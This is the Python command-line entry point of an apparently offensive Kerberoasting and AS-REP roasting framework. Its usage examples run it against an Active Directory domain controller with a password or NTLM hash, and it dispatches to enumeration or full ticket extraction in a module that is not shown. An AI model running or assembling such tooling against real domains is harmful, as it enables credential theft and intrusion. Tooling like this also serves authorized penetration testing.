#!/usr/bin/env python3
"""
CLI Entry Point — Kerberoasting & AS-REP Roasting Framework

Usage:
    python -m kerberoast_framework -d corp.local -u jdoe -p 'Password1' --dc 10.10.10.1
    python -m kerberoast_framework -d corp.local -u jdoe -H aad3b435b51404ee:ntlmhash --dc 10.10.10.1
    python -m kerberoast_framework -d corp.local -u jdoe -p 'Password1' --enumerate-only
"""

import argparse

from .core.framework import KerberoastFramework


def main():
    parser = argparse.ArgumentParser(
        description="Kerberoasting & AS-REP Roasting Framework"
    )
    parser.add_argument("-d", "--domain", required=True, help="Target domain")
    parser.add_argument("-u", "--username", required=True, help="Username")
    parser.add_argument("-p", "--password", default="", help="Password")
    parser.add_argument("-H", "--hash", default="", help="NTLM hash")
    parser.add_argument("--dc", help="Domain controller IP")
    parser.add_argument("-o", "--output", default="roasting", help="Output directory")
    parser.add_argument(
        "--enumerate-only", action="store_true", help="Enumerate only, no extraction"
    )

    args = parser.parse_args()

    framework = KerberoastFramework(
        domain=args.domain,
        username=args.username,
        password=args.password,
        ntlm_hash=args.hash,
        dc_ip=args.dc,
        output_dir=args.output,
    )

    if args.enumerate_only:
        framework.run_enumerate_only()
    else:
        framework.run_full_roast()


if __name__ == "__main__":
    main()